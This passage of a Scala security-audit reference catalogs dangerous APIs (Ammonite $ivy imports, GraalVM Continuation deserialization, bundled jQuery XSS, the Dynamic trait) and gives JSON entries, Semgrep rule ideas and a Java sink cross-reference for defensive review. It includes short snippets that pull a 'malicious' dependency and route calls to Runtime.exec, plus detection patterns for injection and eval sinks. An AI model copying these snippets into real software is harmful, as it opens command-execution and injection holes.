**Risk**: Ammonite's `import $ivy` downloads and executes arbitrary dependencies from Maven Central without any sandboxing — full build-machine compromise.

```scala
// In an Ammonite script:
import $ivy.`com.malicious:evil-library:1.0`
// This downloads and executes arbitrary code in the REPL JVM
```

**Ref**: Ammonite documentation.

```json
{ "sink_id": "SCALA-XC-002", "category": "cross-cutting", "title": "Ammonite import $ivy no sandbox", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://ammonite.io/#import$ivy", "title": "Ammonite $ivy imports", "author": "Li Haoyi", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 13.3 GraalVM Espresso Continuation API ROP-like Deserialization
**Risk**: GraalVM Espresso's Continuation API serializes the entire JVM call stack. Attacker controlling deserialized `Continuation` forges stack frames to call `Runtime.exec()` — a ROP-like attack using JDK internal classes.

**Ref**: X1r0z — GEEKCON 2025.

```json
{ "sink_id": "SCALA-XC-003", "category": "cross-cutting", "title": "GraalVM Espresso Continuation ROP deserialization", "severity": "critical", "sources": [{ "type": "conference", "url": "https://geekcon.org/", "title": "GEEKCON 2025", "author": "X1r0z", "date": "2025-01-01" }], "confidence": "likely" }
```

### 13.4 Scala Compiler as Library — Scala-Compiler.jar Bundles Vulnerable jQuery
**Risk**: `scala-compiler.jar` bundles jQuery 1.8.2 (CVE-2012-6708, CVE-2019-11358, CVE-2020-11023) for Scaladoc. Any application serving Scaladoc is XSS-vulnerable.

**Ref**: scala/bug#11974.

```json
{ "sink_id": "SCALA-XC-004", "category": "cross-cutting", "title": "scala-compiler bundles vulnerable jQuery XSS", "severity": "medium", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/11974", "title": "scala-compiler contains jQuery below 3.5.0", "author": "scala/bug", "date": "2020-05-04" }], "confidence": "confirmed" }
```

### 13.5 Scala 2 `Dynamic` Trait Abuse
**Risk**: Classes extending `scala.Dynamic` get method calls rewritten to `applyDynamic`/`selectDynamic` with string names — enabling reflective access to arbitrary members.

```scala
import scala.language.dynamics
class AttackerDynamic extends Dynamic {
  def applyDynamic(name: String)(args: Any*): Any = {
    if (name == "exec") Runtime.getRuntime.exec(args(0).toString)
    else ???
  }
}
val d = new AttackerDynamic
d.exec("id")  // Rewritten to d.applyDynamic("exec")("id")
```

**Ref**: Scala Language Specification — `scala.Dynamic`.

```json
{ "sink_id": "SCALA-XC-005", "category": "cross-cutting", "title": "Dynamic trait reflective call abuse", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/scala3/book/ca-dynamic.html", "title": "Scala Dynamic trait", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## Detection Signatures

### Scala-Specific Semgrep Rule Ideas

```yaml
# ToolBox.eval / ToolBox.parse — Scala RCE
rules:
  - id: scala-toolbox-eval
    patterns:
      - pattern: |
          $TOOLBOX.eval($INPUT)
      - pattern: |
          $TOOLBOX.parse($INPUT)
    message: "ToolBox.eval/parse with user input — Scala RCE"
    severity: ERROR
    languages: [scala]

  - id: scala-unsafe-reflect
    patterns:
      - pattern: |
          scala.reflect.runtime.currentMirror.$FUNC(...)
    message: "Scala runtime reflection — potential access bypass"
    severity: WARNING
    languages: [scala]

  - id: scala-staging-run
    patterns:
      - pattern: |
          scala.quoted.staging.$FUNC(...)
    message: "Scala 3 staging.run — runtime code generation"
    severity: ERROR
    languages: [scala]

  - id: slick-literal-splicing
    patterns:
      - pattern: |
          sql"... #$ $VAR ..."
    message: "Slick #$ literal splicing — SQL injection"
    severity: ERROR
    languages: [scala]

  - id: play-twirl-html-raw
    patterns:
      - pattern: |
          @Html($VAR)
    message: "Twirl @Html bypasses auto-escaping — XSS"
    severity: WARNING
    languages: [scala, html]

  - id: scala-js-innerhtml
    patterns:
      - pattern: |
          $EL.innerHTML = $VAR
    message: "Scala.js innerHTML assignment — XSS"
    severity: ERROR
    languages: [scala]

  - id: scala-js-dynamic-eval
    patterns:
      - pattern: |
          js.Dynamic.global.eval($VAR)
    message: "Scala.js dynamic eval — arbitrary JS execution"
    severity: ERROR
    languages: [scala]
```

### CodeQL Query Ideas

| Query | Description | File Pattern |
|-------|-------------|-------------|
| `scala-toolbox-eval` | ToolBox.eval with tainted input | `*.scala` |
| `scala-unsafe-reflect` | runtimeMirror + user-controlled class name | `*.scala` |
| `scala-slick-sqli` | Slick `#$` with user-controlled string | `*.scala` |
| `scala-doobie-sqli` | Doobie `Fragment.const` with user input | `*.scala` |
| `scala-quill-infusion` | Quill `infix` with tainted string | `*.scala` |
| `scala-play-html` | Play Twirl `@Html(tainted)` | `*.scala.html` |
| `scala-js-dom-xss` | Scala.js DOM manipulation with taint | `*.scala` |
| `scala-effect-unsafe` | `unsafeRunSync`/`unsafeRun` in libraries | `*.scala` |

> **CodeQL caveat**: There is no first-class Scala extractor. Strategy: compile with `-Xprint-bytecode` or analyze the produced JARs as Java — works for sinks that ultimately call into JDK / Java libraries (JDBC, JNDI, `ObjectInputStream`, `Runtime.exec`). Loses Scala-specific surface (Slick `#$`, Twirl, macros, ZIO/Cats fibers, structural types) — rely on Semgrep / SpotBugs there.

### Scala-Aware SAST / DAST Tooling

Pick more than one — no single Scala SAST is comprehensive. Compose them.

| Tool | Type | Strength on Scala | Limitation |
|------|------|-------------------|-----------|
| **Semgrep** (OSS) | Source-pattern SAST | Custom rules for Slick `#$`, Twirl, ZIO `unsafe.run`, `js.Dynamic.eval`, sbt `RootProject(uri)` | Pattern-only — no taint tracking across functions |
| **SpotBugs + FindSecBugs** | Bytecode SAST | Works on compiled Scala JARs; ~144 vuln patterns aligned with OWASP Top 10; catches `ObjectInputStream`, weak crypto, JDBC concat | Operates on JVM bytecode → loses higher-kinded Scala constructs; false positives from Scala collections |
| **SonarQube / SonarCloud** | Hybrid | First-party Scala support, "Security Hotspots" rules, CI-friendly | Broad-net quality tool, not a security oracle; weak on Scala framework specifics |
| **DerScanner** (commercial) | Scala-specific SAST | 170+ Scala-labelled rules, dependency analysis, XSS/SQLi/deserialization | Closed source; vendor-dependent rule fidelity |
| **CodeQL** (Java mode) | Taint-tracking SAST | Strong taint tracking on JDK/Java interop pieces (auth libs, JDBC, Jackson) | No first-class Scala — Scala-specific sinks invisible |
| **OWASP ZAP** | DAST | Auth/CSRF/XSS/header/CORS scanning of Play, http4s, Akka HTTP, ZIO HTTP endpoints | Black-box — won't surface internal taint flows |
| **Burp Suite** | DAST + manual | Repeater/Intruder for OAuth, GraphQL alias batching (§5.17), session/CSRF logic | Manual labour-intensive; commercial Pro for scanner |

**Pipeline recommendation**: SpotBugs+FindSecBugs and SonarQube on every CI build → Semgrep with the rule set above for Scala-specific surface → CodeQL (Java mode) gated to interop/auth libraries → ZAP authenticated scan against staging → Burp for manual audit of complex flows (OAuth/GraphQL/multi-step).

**Training**: Security Compass `SCL201 — Defending Scala` is the only Scala-specific secure-coding course; OWASP Top 10 2021 + 2025 comparison is the threat-model anchor.

### References — Scala Security Reading List

- Kodem — *Addressing Scala Security Vulnerabilities* (Scala-flavoured SQLi, deserialization, reflection, crypto pitfalls).
- Scaler — *Scala Security* (secure-coding checklist).
- Scalac — *Scala & Akka: How to Secure Your Code* (TLS, remoting, supervision).
- Play Framework Security Guide (sessions, CSRF, "keep your secret secret").
- Rock the JVM — *Configuring http4s Security: Handling CORS and CSRF*.
- http4s GitHub Security Advisories (CORS/origin reflection, response splitting).
- OWASP Find Security Bugs — plugin docs and rule catalog.
- OWASP Top 10 2021 + Practical DevSecOps 2021↔2025 comparison.

---

## Cross-Reference: Java Shared Sinks

Scala runs on the JVM. All Java sinks from `java.md` apply directly:

| Java Sink | Scala Equivalent |
|-----------|-----------------|
| `Runtime.getRuntime().exec()` | Same in Scala |
| `ObjectInputStream.readObject()` | Same — used by Akka, Spark, many libs |
| `JNDI lookup()` | Same |
| `ProcessBuilder.start()` | `scala.sys.process.!!` wraps this |
| `XMLDecoder.readObject()` | Same |
| `SnakeYAML Yaml.load()` | Same |
| `sun.misc.Unsafe` | Same — accessible from Scala |
| `InetAddress.getByName()` SSRF | Same |
| `BigDecimal("5e912345")` CPU DoS | Same in Scala |

---

> **Remember**: Java sink catalog (`java.md`) is the companion for any Scala audit. The Scala-specific surface here adds type system exploits, runtime meta-programming, lazy evaluation attacks, effect system resource leaks, actor model vulnerabilities, and build ecosystem supply chain risks — but the Java deserialization, JNDI, and class-loader attack surface is always present.
